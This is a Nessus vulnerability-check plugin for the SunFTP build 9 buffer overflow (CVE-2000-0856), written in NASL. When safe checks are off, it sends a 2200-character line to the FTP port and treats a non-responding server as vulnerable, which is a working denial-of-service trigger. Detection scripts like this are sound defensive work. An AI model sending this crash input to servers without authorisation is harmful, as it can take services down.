#
# This script was written by Xue Yong Zhi <xueyong@udel.edu>
#
# See the Nessus Scripts License for details
#
# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (2/03/2009)
# - Updated to use compat.inc,added CVSS score, updated security_hole() to use extra  (1/20/2009)
# - Added patch date (08/23/2013)

include("compat.inc");

if(description)
{
 script_id(11373);
 script_bugtraq_id(1638);
 script_osvdb_id(1539);
 script_version ("$Revision: 1.14 $");
 script_cve_id("CVE-2000-0856");

 script_name(english:"SunFTP GET Request Remote Overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by a 
buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"Buffer overflow in SunFTP build 9(1) allows remote attackers to cause
a denial of service or possibly execute arbitrary commands by sending
more than 2100 characters to the server." );
 script_set_attribute(attribute:"solution", value:
"Switching to another FTP server, SunFTP is discontinued." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/03/13");
 script_set_attribute(attribute:"patch_publication_date", value: "2000/09/01");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/09/01");
 script_cvs_date("$Date: 2013/08/23 22:13:57 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


 script_summary(english:"Checks if the remote SunFTP can be buffer overflown");
 script_category(ACT_MIXED_ATTACK); 
 script_family(english:"FTP");

 script_copyright(english:"This script is Copyright (C) 2003-2013 Xue Yong Zhi");

 script_dependencie("ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here :
#

include("ftp_func.inc");

port = get_ftp_port(default: 21);

if(safe_checks())
{
 banner = get_ftp_banner(port: port);
 if(banner)
 {
  if("SunFTP b9"><banner) {
    desc = "
Buffer overflow in SunFTP build 9(1) allows remote attackers to cause
a denial of service or possibly execute arbitrary commands by sending
more than 2100 characters to the server.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.";

  security_hole(port:port, extra:desc);
  }
 }

 exit(0);
}


# Connect to the FTP server
soc = open_sock_tcp(port);
if (! soc) exit(1);

  # make sure the FTP server exists
send(socket:soc, data: 'help\r\n');
  b = ftp_recv_line(socket:soc);
  if(!b)exit(0);
  if("SunFTP" >!< b)exit(0);
  close(soc);
  
soc = open_sock_tcp(port);
if (! soc) exit(1);

longstring = crap(2200);
send(socket:soc, data: longstring+'\r\n');
  b = ftp_recv_line(socket:soc);
  if(!b){
	security_hole(port);
	exit(0);
  } else {
	ftp_close(socket:soc);
  }
